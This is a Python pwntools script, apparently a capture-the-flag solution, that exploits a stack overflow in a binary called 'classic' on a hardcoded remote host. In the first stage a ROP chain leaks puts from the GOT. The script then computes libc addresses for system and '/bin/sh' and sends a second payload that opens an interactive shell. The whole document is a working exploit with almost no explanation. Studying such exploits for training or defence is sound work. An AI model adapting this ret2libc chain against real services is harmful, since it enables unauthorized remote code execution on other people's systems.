#!/usr/bin/env python3
from pwn import *

BIN  = './classic'
IP   = '141.85.224.109'
PORT = 51559

context.arch = 'amd64'
context.os = 'linux'
context.bits = 64
context.endian = 'little'
context.log_level = 'debug'
context.binary = BIN

# Address of the main function
main_addr = 0x400647

# Libc offsets inside my own pc (not remote)
# system_libc_offset = 0x23e10
# puts_libc_offset = 0x050210

# Get offsets from provided libc
libc = ELF('./libc.so.6')
system_libc_offset = libc.symbols['system']
puts_libc_offset = libc.symbols['puts']
bin_sh_offset = next(libc.search(b'/bin/sh'))

# Rop gadget inside the binary
pop_rdi_ret = 0x400773

# Address of puts plt to be used for calculation
puts_plt = 0x400520

# Address of puts got to be used for printing
puts_got = 0x601018

# Used to run on local # currently broken with the env # uses default libc actually
# io = process(BIN, env={'LD_PRELOAD': 'libc.so.6'})
# gdb.attach(io)

io = remote(IP, PORT)

# Greet message
greet = io.recvline()

# Prefix to sending
prefix = io.recvuntil(': ')

# Send payload1
payload = b'A' * 48 + b'B' * 8 + pack(pop_rdi_ret) + pack(puts_got) + pack(puts_plt) + pack(main_addr)
io.send(payload)

result = io.recvuntil('!')

# Stage one complete

# Recv the leaked address
result = io.recvuntil('H')
addr_puts_in_libc = unpack(result[1:-2] + b'\x00\x00')

# Calculate offsets of system and /bin/sh
addr_system_in_libc = addr_puts_in_libc - puts_libc_offset + system_libc_offset
addr_bin_sh_in_libc = addr_puts_in_libc - puts_libc_offset + bin_sh_offset

# Now the Ropchain will redirect to main so we have to read again
# Greet message
greet = io.recvline()

# Prefix to sending
prefix = io.recvuntil(': ')

# Send payload2 to call system with calculated offsets
payload2 = b'A' * 48 + b'B' * 8 + pack(pop_rdi_ret) + pack(addr_bin_sh_in_libc) + pack(addr_system_in_libc)
io.send(payload2)

# Recv messages
result = io.recvline()

# Get shell
io.interactive()
